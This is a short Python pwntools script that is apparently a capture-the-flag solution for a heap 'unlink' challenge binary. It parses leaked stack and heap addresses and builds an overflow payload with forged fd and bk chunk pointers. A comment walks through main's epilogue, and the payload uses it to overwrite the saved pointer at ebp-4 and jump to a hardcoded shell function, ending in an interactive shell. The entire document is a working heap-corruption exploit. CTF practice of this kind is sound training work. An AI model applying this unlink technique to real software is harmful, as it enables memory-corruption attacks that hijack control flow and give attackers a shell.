from pwn import *
p = process('./unlink')

stack_addr = int(p.recvline().split(':')[1], 16)
log.info('stack_addr : ' + hex(stack_addr))

heap_addr = int(p.recvline().split(':')[1], 16)
log.info('heap_addr : ' + hex(heap_addr))

shell_addr = 0x080484eb

ebp = stack_addr + 0x14
buf_addr = heap_addr + 0x8

payload  = p32(shell_addr) + 'A' * 12 
payload += 'A' * 4 # buf + 4
payload += 'A' * 4 # B's prev_size
payload += 'A' * 4 # B's size
payload += p32(buf_addr + 4) # B's fd
payload += p32(ebp - 4) # B's bk

'''
main's return address is DWORD PTR [ebp - 4] - 4
   0x080485ff <+208>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048602 <+211>:	leave  
   0x08048603 <+212>:	lea    esp,[ecx-0x4]
   0x08048606 <+215>:	ret 

So, our goal is to replace ebp - 4 with shell_addr + 4
'''

p.sendline(payload)
p.interactive()
